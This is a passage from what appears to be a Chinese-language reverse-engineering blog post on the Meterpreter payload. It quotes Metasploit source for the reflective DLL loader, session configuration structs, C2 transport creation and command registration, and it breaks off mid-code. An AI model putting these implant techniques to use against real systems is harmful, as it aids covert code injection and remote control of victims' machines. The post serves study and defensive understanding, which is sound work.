<p>接下来我们进行分析的<code>ReflectiveLoader</code>函数源码在此<a href="https://github.com/rapid7/metasploit-payloads/tree/master/c/meterpreter" target="_blank" rel="noopener">github地址</a>，我们可以将源码克隆到本地可以使用VS开打工程进行分析，图15<code>0x1D136B</code>地址处为<code>ReflectiveLoader</code>函数逻辑开始处，接下来我们将主要对源码实现进行分析</p>
<img src="/Internals_meterpreter_payload/15.jpg" title="图15">
<p>首先初始化了5个函数指针变量</p>
<img src="/Internals_meterpreter_payload/16.jpg" title="图16">
<p>和我们逆向分析的相同调用了一个函数进行GetPC操作</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> intrinsic( _ReturnAddress )</span></span><br><span class="line"><span class="comment">// This function can not be inlined by the compiler or we will not get the address we expect. Ideally </span></span><br><span class="line"><span class="comment">// this code will be compiled with the /O2 and /Ob1 switches. Bonus points if we could take advantage of </span></span><br><span class="line"><span class="comment">// RIP relative addressing in this instance but I dont believe we can do so with the compiler intrinsics </span></span><br><span class="line"><span class="comment">// available (and no inline asm available under x64).</span></span><br><span class="line">__declspec(noinline) <span class="function">ULONG_PTR <span class="title">caller</span><span class="params">( VOID )</span> </span>&#123; <span class="keyword">return</span> (ULONG_PTR)_ReturnAddress(); &#125;</span><br><span class="line"><span class="comment">// STEP 0: calculate our images current base address</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// we will start searching backwards from our callers return address.</span></span><br><span class="line">uiLibraryAddress = caller();</span><br></pre></td></tr></table></figure>
<p>接下来的操作就是用GetPC获取的地址进行<code>uiLibraryAddress--</code>搜索GetPC之前的内存获取Dos头MZ标志，之后获取到NT头的Signature就结束循环</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">   <span class="comment">// loop through memory backwards searching for our images base address</span></span><br><span class="line"><span class="comment">// we dont need SEH style search as we shouldnt generate any access violations with this</span></span><br><span class="line"><span class="keyword">while</span>( TRUE )</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span>( ((PIMAGE_DOS_HEADER)uiLibraryAddress)-&gt;e_magic == IMAGE_DOS_SIGNATURE )</span><br><span class="line">	&#123;</span><br><span class="line">		uiHeaderValue = ((PIMAGE_DOS_HEADER)uiLibraryAddress)-&gt;e_lfanew;</span><br><span class="line">		<span class="comment">// some x64 dll's can trigger a bogus signature (IMAGE_DOS_SIGNATURE == 'POP r10'),</span></span><br><span class="line">		<span class="comment">// we sanity check the e_lfanew with an upper threshold value of 1024 to avoid problems.</span></span><br><span class="line">		<span class="keyword">if</span>( uiHeaderValue &gt;= <span class="keyword">sizeof</span>(IMAGE_DOS_HEADER) &amp;&amp; uiHeaderValue &lt; <span class="number">1024</span> )</span><br><span class="line">		&#123;</span><br><span class="line">			uiHeaderValue += uiLibraryAddress;</span><br><span class="line">			<span class="comment">// break if we have found a valid MZ/PE header</span></span><br><span class="line">			<span class="keyword">if</span>( ((PIMAGE_NT_HEADERS)uiHeaderValue)-&gt;Signature == IMAGE_NT_SIGNATURE )</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	uiLibraryAddress--;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以看到图17源码中的宏定义<code>WIN_ARM</code>可见Meterpreter支持了Windows全平台的shellcode，接下来的部分源码我就不再分析了，如图17所示接下来的shellcode主要就是要获取所需要的5个函数，套路无非就是先获取PEB然后再…….</p>
<img src="/Internals_meterpreter_payload/17.jpg" title="图17">
<p>如果获取了所需的全部函数地址则停止搜索</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">		<span class="comment">// we stop searching when we have found everything we need.</span></span><br><span class="line">		<span class="keyword">if</span>( pLoadLibraryA</span><br><span class="line">			&amp;&amp; pGetProcAddress</span><br><span class="line">			&amp;&amp; pVirtualAlloc</span><br><span class="line">#ifdef ENABLE_STOPPAGING</span><br><span class="line">			&amp;&amp; pVirtualLock</span><br><span class="line">#endif</span><br><span class="line">			&amp;&amp; pNtFlushInstructionCache</span><br><span class="line">#ifdef ENABLE_OUTPUTDEBUGSTRING</span><br><span class="line">			&amp;&amp; pOutputDebug</span><br><span class="line">#endif</span><br><span class="line">			)</span><br><span class="line">			<span class="keyword">break</span>;</span><br></pre></td></tr></table></figure>
<p>获取了所需的函数之后进行的操作就是反射式注入了，我们只介绍反射式注入大概实现流程</p>
<p>步骤一：首先根据<code>IMAGE_NT_HEADERS-&gt;OptionalHeader.SizeOfImage</code>为参数分配一块内存，然后使用VirtualLock函数防止这块内存被交换到硬盘中</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// STEP 2: load our image into a new permanent location in memory...</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">// get the VA of the NT Header for the PE to be loaded</span></span><br><span class="line">	uiHeaderValue = uiLibraryAddress + ((PIMAGE_DOS_HEADER)uiLibraryAddress)-&gt;e_lfanew;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// allocate all the memory for the DLL to be loaded into. we can load at any address because we will  </span></span><br><span class="line">	<span class="comment">// relocate the image. Also zeros all memory and marks it as READ, WRITE and EXECUTE to avoid any problems.</span></span><br><span class="line">	uiBaseAddress = (ULONG_PTR)pVirtualAlloc( <span class="literal">NULL</span>, ((PIMAGE_NT_HEADERS)uiHeaderValue)-&gt;OptionalHeader.SizeOfImage, MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE );</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> ENABLE_STOPPAGING</span></span><br><span class="line">	<span class="comment">// prevent our image from being swapped to the pagefile</span></span><br><span class="line">	pVirtualLock((LPVOID)uiBaseAddress, ((PIMAGE_NT_HEADERS)uiHeaderValue)-&gt;OptionalHeader.SizeOfImage);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure>
<p>步骤二：将各个节区以内存对齐方式拷贝到新内存中</p>
<p>步骤三：处理导入表</p>
<p>步骤四：处理所有重定位</p>
<p>完成反射式注入之后首先会使用<code>DLL_PROCESS_ATTACH</code>为参数调用DllMain，最后操作<code>return uiValueA</code>将会返回到<code>bootstrapper</code>执行</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// STEP 6: call our images entry point</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">// uiValueA = the VA of our newly loaded DLL/EXE's entry point</span></span><br><span class="line">	uiValueA = ( uiBaseAddress + ((PIMAGE_NT_HEADERS)uiHeaderValue)-&gt;OptionalHeader.AddressOfEntryPoint );</span><br><span class="line"></span><br><span class="line">	OUTPUTDBG(<span class="string">"Flushing the instruction cache"</span>);</span><br><span class="line">	<span class="comment">// We must flush the instruction cache to avoid stale code being used which was updated by our relocation processing.</span></span><br><span class="line">	pNtFlushInstructionCache( (HANDLE)<span class="number">-1</span>, <span class="literal">NULL</span>, <span class="number">0</span> );</span><br><span class="line"></span><br><span class="line">	<span class="comment">// call our respective entry point, fudging our hInstance value</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> REFLECTIVEDLLINJECTION_VIA_LOADREMOTELIBRARYR</span></span><br><span class="line">	<span class="comment">// if we are injecting a DLL via LoadRemoteLibraryR we call DllMain and pass in our parameter (via the DllMain lpReserved parameter)</span></span><br><span class="line">	((DLLMAIN)uiValueA)( (HINSTANCE)uiBaseAddress, DLL_PROCESS_ATTACH, lpParameter );</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">	<span class="comment">// if we are injecting an DLL via a stub we call DllMain with no parameter</span></span><br><span class="line">	((DLLMAIN)uiValueA)( (HINSTANCE)uiBaseAddress, DLL_PROCESS_ATTACH, <span class="literal">NULL</span> );</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">	<span class="comment">// STEP 8: return our new entry point address so whatever called us can call DllMain() if needed.</span></span><br><span class="line">	<span class="keyword">return</span> uiValueA;</span><br></pre></td></tr></table></figure>
<p>图18为ReflectiveLoader函数执行完后要返回栈顶的<code>bootstrapper</code>执行</p>
<img src="/Internals_meterpreter_payload/18.jpg" title="图18">
<p>图19处<code>bootstrapper</code>以<code>DLL_METASPLOIT_ATTACH</code>为参数调用了DllMain</p>
<img src="/Internals_meterpreter_payload/19.jpg" title="图19">
<p>我们查看DllMain源代码，以<code>DLL_METASPLOIT_ATTACH</code>为参数调用DllMain就会执行<code>MetasploitDllAttach</code>函数，接着<code>MetasploitDllAttach</code>函数调用了<code>Init</code>函数</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">MetasploitDllAttach</span><span class="params">( SOCKET socket )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	Init( socket );</span><br><span class="line">	<span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL WINAPI <span class="title">DllMain</span><span class="params">( HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpReserved )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    BOOL bReturnValue = TRUE;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">switch</span>( dwReason ) </span><br><span class="line">    &#123; </span><br><span class="line">		<span class="keyword">case</span> DLL_METASPLOIT_ATTACH:</span><br><span class="line">			bReturnValue = MetasploitDllAttach( (SOCKET)lpReserved );</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> DLL_METASPLOIT_DETACH:</span><br><span class="line">			bReturnValue = MetasploitDllDetach( (DWORD)lpReserved );</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> DLL_QUERY_HMODULE:</span><br><span class="line">			<span class="keyword">if</span>( lpReserved != <span class="literal">NULL</span> )</span><br><span class="line">				*(HMODULE *)lpReserved = hAppInstance;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> DLL_PROCESS_ATTACH:</span><br><span class="line">			hAppInstance = hinstDLL;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> DLL_PROCESS_DETACH:</span><br><span class="line">		<span class="keyword">case</span> DLL_THREAD_ATTACH:</span><br><span class="line">		<span class="keyword">case</span> DLL_THREAD_DETACH:</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="keyword">return</span> bReturnValue;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>我们查看<code>Init</code>函数实现源码，源码注释说了传给<code>init</code>函数的参数其实不是socket而是一个指向<code>metConfig</code>结构的指针所以将<code>fd</code>进行强转成<code>MetsrvConfig*</code>类型，该函数主要调用了<code>server_setup</code>函数进行服务器设置，<code>switch case</code>语句主要对应了<code>meterpreter</code>控制命令几种不同<code>exitfunc</code>方式</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">DWORD __declspec(dllexport) Init(SOCKET fd)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">// 在metsrv有效负载的情况下，传递给init的参数不是套接字, 它实际上是</span></span><br><span class="line">	<span class="comment">// 一个指向metConfig的指针，所以进行一次糟糕的转换，然后继续。</span></span><br><span class="line">	MetsrvConfig* metConfig = (MetsrvConfig*)fd;</span><br><span class="line">	dprintf(<span class="string">"[METSRV] Getting ready to init with config %p"</span>, metConfig);</span><br><span class="line">	DWORD result = server_setup(metConfig);</span><br><span class="line"></span><br><span class="line">	dprintf(<span class="string">"[METSRV] Exiting with %08x"</span>, metConfig-&gt;session.exit_func);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// We also handle exit func directly in metsrv now because the value is added to the</span></span><br><span class="line">	<span class="comment">// configuration block and we manage to save bytes in the stager/header as well.</span></span><br><span class="line">	<span class="keyword">switch</span> (metConfig-&gt;session.exit_func)</span><br><span class="line">	&#123;</span><br><span class="line">	<span class="keyword">case</span> EXITFUNC_SEH:</span><br><span class="line">		SetUnhandledExceptionFilter(<span class="literal">NULL</span>);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> EXITFUNC_THREAD:</span><br><span class="line">		ExitThread(<span class="number">0</span>);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> EXITFUNC_PROCESS:</span><br><span class="line">		ExitProcess(<span class="number">0</span>);</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">default</span>:</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>此为<code>meterpreter</code>中几种的<code>exitfunc</code>方式</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Payload options (windows/meterpreter/reverse_tcp):</span><br><span class="line"></span><br><span class="line">   Name      Current Setting  Required  Description</span><br><span class="line">   ----      ---------------  --------  -----------</span><br><span class="line">   EXITFUNC  process          yes       Exit technique (Accepted: &apos;&apos;, seh, thread, process, none)</span><br></pre></td></tr></table></figure>
<p>我们查看<code>MetsrvSession</code>结构体的定义，此结构体的成员为<code>MetsrvSession</code>结构体和<code>MetsrvTransportCommon</code>结构体数组，<code>MetsrvSession</code>结构体我们可以看到源码注释中可以判断此结构体主要是管理<code>session</code>的各种信息，比如当前<code>session</code>的退出<code>func</code>标识符此标识符对应<code>Init</code>函数中的<code>switch case</code>语句，还有当前会话的<code>GUID</code>和<code>UUID</code>等，<code>MetsrvTransportCommon</code>结构体数组中的成员主要作用是管理传输<code>host:port/URI</code>，还有在传输过程中关于通讯连接的会话数和连接通讯时间等</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">MetsrvSession</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">	<span class="keyword">union</span></span><br><span class="line">	&#123;</span><br><span class="line">		UINT_PTR handle;</span><br><span class="line">		BYTE padding[<span class="number">8</span>];</span><br><span class="line">	&#125; comms_handle;                       <span class="comment">///! Socket/handle for communications (如果有的话).</span></span><br><span class="line">	DWORD exit_func;                      <span class="comment">///! 当会话结束时退出func标识符.</span></span><br><span class="line">	<span class="keyword">int</span> expiry;                           <span class="comment">///! 在终止会话之前等待的总秒数.</span></span><br><span class="line">	BYTE uuid[UUID_SIZE];                 <span class="comment">///! UUID</span></span><br><span class="line">	BYTE session_guid[<span class="keyword">sizeof</span>(GUID)];      <span class="comment">///! 当前 会话 GUID</span></span><br><span class="line">&#125; MetsrvSession;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">MetsrvTransportCommon</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">	CHARTYPE url[URL_SIZE];               <span class="comment">///! Transport url:  scheme://host:port/URI</span></span><br><span class="line">	<span class="keyword">int</span> comms_timeout;                    <span class="comment">///! 等待新包的会话数.</span></span><br><span class="line">	<span class="keyword">int</span> retry_total;                      <span class="comment">///! 重试通讯的总秒数.</span></span><br><span class="line">	<span class="keyword">int</span> retry_wait;                       <span class="comment">///! 重新连接之间等待的秒数.</span></span><br><span class="line">&#125; MetsrvTransportCommon;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">MetsrvConfig</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">	MetsrvSession session;</span><br><span class="line">	MetsrvTransportCommon transports[<span class="number">1</span>];  <span class="comment">///! 占位符，用于0个或多个传输</span></span><br><span class="line">	<span class="comment">// 扩展将在此之后出现</span></span><br><span class="line">	<span class="comment">// 在扩展之后，我们得到一个扩展初始化器列表</span></span><br><span class="line">	<span class="comment">// &lt;扩展名1&gt;\x00&lt;datasize&gt;&lt;data&gt;</span></span><br><span class="line">	<span class="comment">// &lt;扩展名2&gt;\x00&lt;datasize&gt;&lt;data&gt;</span></span><br><span class="line">	<span class="comment">// \x00</span></span><br><span class="line">&#125; MetsrvConfig;</span><br></pre></td></tr></table></figure>
<p>在<code>MetsrvConfig</code>结构体末尾的注释告诉了我们两个扩展模块的布局，所以灵魂画师上线如图20所示这就是两个扩展模块的大概布局</p>
<img src="/Internals_meterpreter_payload/20.jpg" title="图20">
<p><code>server_setup</code>函数主要的函数逻辑大概为<code>create_transports-&gt;register_dispatch_routines-&gt;load_stageless_extensions-&gt;server_dispatch</code>这个流程，<code>create_transports</code>函数会判断<code>MetsrvTransportCommon</code>结构体数组中的<code>url</code>字段是否有效，如果有效然后调用<code>create_transport</code>函数根据<code>url</code>字段进行创建<code>transport</code></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> Transport* <span class="title">create_transport</span><span class="params">(Remote* remote, MetsrvTransportCommon* transportCommon, LPDWORD size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	Transport* transport = <span class="literal">NULL</span>;</span><br><span class="line">	dprintf(<span class="string">"[TRNS] Transport claims to have URL: %S"</span>, transportCommon-&gt;url);</span><br><span class="line">	dprintf(<span class="string">"[TRNS] Transport claims to have comms: %d"</span>, transportCommon-&gt;comms_timeout);</span><br><span class="line">	dprintf(<span class="string">"[TRNS] Transport claims to have retry total: %d"</span>, transportCommon-&gt;retry_total);</span><br><span class="line">	dprintf(<span class="string">"[TRNS] Transport claims to have retry wait: %d"</span>, transportCommon-&gt;retry_wait);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (wcsncmp(transportCommon-&gt;url, <span class="string">L"tcp"</span>, <span class="number">3</span>) == <span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		transport = transport_create_tcp((MetsrvTransportTcp*)transportCommon, size);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span> (wcsncmp(transportCommon-&gt;url, <span class="string">L"pipe"</span>, <span class="number">4</span>) == <span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		transport = transport_create_named_pipe((MetsrvTransportNamedPipe*)transportCommon, size);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		transport = transport_create_http((MetsrvTransportHttp*)transportCommon, size);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (transport == <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">// something went wrong</span></span><br><span class="line">		<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// always insert at the tail. The first transport will be the one that kicked everything off</span></span><br><span class="line">	<span class="keyword">if</span> (remote-&gt;transport == <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">// point to itself, as this is the first transport.</span></span><br><span class="line">		transport-&gt;next_transport = transport-&gt;prev_transport = transport;</span><br><span class="line">		remote-&gt;transport = transport;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		transport-&gt;prev_transport = remote-&gt;transport-&gt;prev_transport;</span><br><span class="line">		transport-&gt;next_transport = remote-&gt;transport;</span><br><span class="line"></span><br><span class="line">		remote-&gt;transport-&gt;prev_transport-&gt;next_transport = transport;</span><br><span class="line">		remote-&gt;transport-&gt;prev_transport = transport;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> transport;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> BOOL <span class="title">create_transports</span><span class="params">(Remote* remote, MetsrvTransportCommon* transports, LPDWORD parsedSize)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	DWORD totalSize = <span class="number">0</span>;</span><br><span class="line">	MetsrvTransportCommon* current = transports;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// The first part of the transport is always the URL, if it's NULL, we are done.</span></span><br><span class="line">	<span class="keyword">while</span> (current-&gt;url[<span class="number">0</span>] != <span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		DWORD size;</span><br><span class="line">		<span class="keyword">if</span> (create_transport(remote, current, &amp;size) != <span class="literal">NULL</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			dprintf(<span class="string">"[TRANS] transport created of size %u"</span>, size);</span><br><span class="line">			totalSize += size;</span><br><span class="line"></span><br><span class="line">			<span class="comment">// go to the next transport based on the size of the existing one.</span></span><br><span class="line">			current = (MetsrvTransportCommon*)((LPBYTE)current + size);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">		&#123;</span><br><span class="line">			<span class="comment">// This is not good</span></span><br><span class="line">			<span class="keyword">return</span> FALSE;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// account for the last terminating NULL wchar</span></span><br><span class="line">	*parsedSize = totalSize + <span class="keyword">sizeof</span>(<span class="keyword">wchar_t</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>register_dispatch_routines</code>函数调用了<code>command_register_all</code>函数进行注册一个完整的<code>Dispatch table</code>，<code>customCommands</code>参数为<code>Command</code>结构体数组我们可以看到此结构体数组中的每一个元素都为一个派遣处理函数，<code>command</code>结构为一个双向链表，其中的<code>method</code>成员为命令标识符，<code>request</code>和<code>response</code>分别为请求处理程序和响应处理程序，<code>command_register</code>函数将动态注册自定义命令处理程序插入双向链表中</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Dispatch table</span></span><br><span class="line">Command customCommands[] =</span><br><span class="line">&#123;</span><br><span class="line">	COMMAND_REQ(<span class="string">"core_loadlib"</span>, request_core_loadlib),</span><br><span class="line">	COMMAND_REQ(<span class="string">"core_enumextcmd"</span>, request_core_enumextcmd),</span><br><span class="line">	COMMAND_REQ(<span class="string">"core_machine_id"</span>, request_core_machine_id),</span><br><span class="line">	COMMAND_REQ(<span class="string">"core_get_session_guid"</span>, request_core_get_session_guid),</span><br><span class="line">	COMMAND_REQ(<span class="string">"core_set_session_guid"</span>, request_core_set_session_guid),</span><br><span class="line">	COMMAND_REQ(<span class="string">"core_set_uuid"</span>, request_core_set_uuid),</span><br><span class="line">	COMMAND_REQ(<span class="string">"core_pivot_add"</span>, request_core_pivot_add),</span><br><span class="line">	COMMAND_REQ(<span class="string">"core_pivot_remove"</span>, request_core_pivot_remove),</span><br><span class="line">	COMMAND_INLINE_REP(<span class="string">"core_patch_url"</span>, request_core_patch_url),</span><br><span class="line">	COMMAND_TERMINATOR</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*!</span></span><br><span class="line"><span class="comment"> * @命令定义的简短容器.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">command</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">	LPCSTR           method;     <span class="comment">///&lt; 命令的标识符.</span></span><br><span class="line">	PacketDispatcher request;    <span class="comment">///&lt; 定义请求处理程序.</span></span><br><span class="line">	PacketDispatcher response;   <span class="comment">///&lt; 定义响应处理程序.</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">// Internal -- not stored</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">command</span>   *<span class="title">next</span>;</span>      <span class="comment">///&lt; 指向命令列表中的下一个命令的指针.</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">command</span>   *<span class="title">prev</span>;</span>      <span class="comment">///&lt; 指向命令列表中先前命令的指针.</span></span><br><span class="line">&#125; Command;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*!</span></span><br><span class="line"><span class="comment"> * @动态注册自定义命令处理程序</span></span><br><span class="line"><span class="comment"> * @指向应该注册的命令的param命令指针.</span></span><br><span class="line"><span class="comment"> * @当命令成功注册时返回' ERROR_SUCCESS '，否则返回错误.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function">DWORD <span class="title">command_register</span><span class="params">(Command *command)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	Command *newCommand;</span><br><span class="line"></span><br><span class="line">	dprintf(<span class="string">"Registering a new command (%s)..."</span>, command-&gt;method);</span><br><span class="line">	<span class="keyword">if</span> (!(newCommand = (Command *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(Command))))</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">return</span> ERROR_NOT_ENOUGH_MEMORY;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	dprintf(<span class="string">"Allocated memory..."</span>);</span><br><span class="line">	<span class="built_in">memcpy</span>(newCommand, command, <span class="keyword">sizeof</span>(Command));</span><br><span class="line"></span><br><span class="line">	dprintf(<span class="string">"Setting new command..."</span>);</span><br><span class="line">	<span class="keyword">if</span> (extensionCommands)</span><br><span class="line">	&#123;</span><br><span class="line">		extensionCommands-&gt;prev = newCommand;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	dprintf(<span class="string">"Fixing next/prev... %p"</span>, newCommand);</span><br><span class="line">	newCommand-&gt;next = extensionCommands;</span><br><span class="line">	newCommand-&gt;prev = <span class="literal">NULL</span>;</span><br><span class="line">	extensionCommands = newCommand;</span><br><span class="line"></span><br><span class="line">	dprintf(<span class="string">"Done..."</span>);</span><br><span class="line">	<span class="keyword">return</span> ERROR_SUCCESS;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*!</span></span><br><span class="line"><span class="comment"> * @简短的动态注册的命令扩展.</span></span><br><span class="line"><span class="comment"> * @详细说明通过反射加载的扩展动态注册的命令的链接列表.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">Command* extensionCommands = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*!</span></span><br><span class="line"><span class="comment"> * @用meterpreter注册一个完整的命令列表.</span></span><br><span class="line"><span class="comment"> * @param命令将为模块/扩展注册的命令数组.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">command_register_all</span><span class="params">(Command commands[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	DWORD index;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (index = <span class="number">0</span>; commands[index].method; index++)</span><br><span class="line">	&#123;</span><br><span class="line">		command_register(&amp;commands[index]);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> DEBUGTRACE</span></span><br><span class="line">	Command* command;</span><br><span class="line"></span><br><span class="line">	dprintf(<span class="string">"[COMMAND LIST] Listing current extension commands"</span>);</span><br><span class="line">	<span class="keyword">for</span> (command = extensionCommands; command; command = command-&gt;next)</span><br><span class="line">	&#123;</span><br><span class="line">		dprintf(<span class="string">"[COMMAND LIST] Found: %s"</span>, command-&gt;method);</span><br><span class="line">	&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 注册自定义命令处理程序</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function">VOID <span class="title">register_dispatch_routines</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	gExtensionList = list_create();</span><br><span class="line"></span><br><span class="line">	command_register_all(customCommands);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在注册分派例程之后完成后<code>load_stageless_extensions</code>函数将会加载需要的扩展模块</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*!</span></span><br><span class="line"><span class="comment"> * @brief Load any stageless extensions that might be present in the current payload.</span></span><br><span class="line"><span class="comment"> * @param remote Pointer to the remote instance.</span></span><br><span class="line"><span class="comment"> * @param fd The socket descriptor passed to metsrv during intialisation.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function">VOID <span class="title">load_stageless_extensions</span><span class="params">(Remote* remote, MetsrvExtension* stagelessExtensions)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">while</span> (stagelessExtensions-&gt;size &gt; <span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		dprintf(<span class="string">"[SERVER] Extension located at 0x%p: %u bytes"</span>, stagelessExtensions-&gt;dll, stagelessExtensions-&gt;size);</span><br><span class="line">		HMODULE hLibrary = LoadLibraryR(stagelessExtensions-&gt;dll, stagelessExtensions-&gt;size);</span><br><span class="line">		load_extension(hLibrary, TRUE, remote, <span class="literal">NULL</span>, extensionCommands);</span><br><span class="line">		stagelessExtensions = (MetsrvExtension*)((LPBYTE)stagelessExtensions-&gt;dll + stagelessExtensions-&gt;size);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	dprintf(<span class="string">"[SERVER] All stageless extensions loaded"</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// once we have reached the end, we may have extension initializers</span></span><br><span class="line">	LPBYTE initData = (LPBYTE)(&amp;stagelessExtensions-&gt;size) + <span 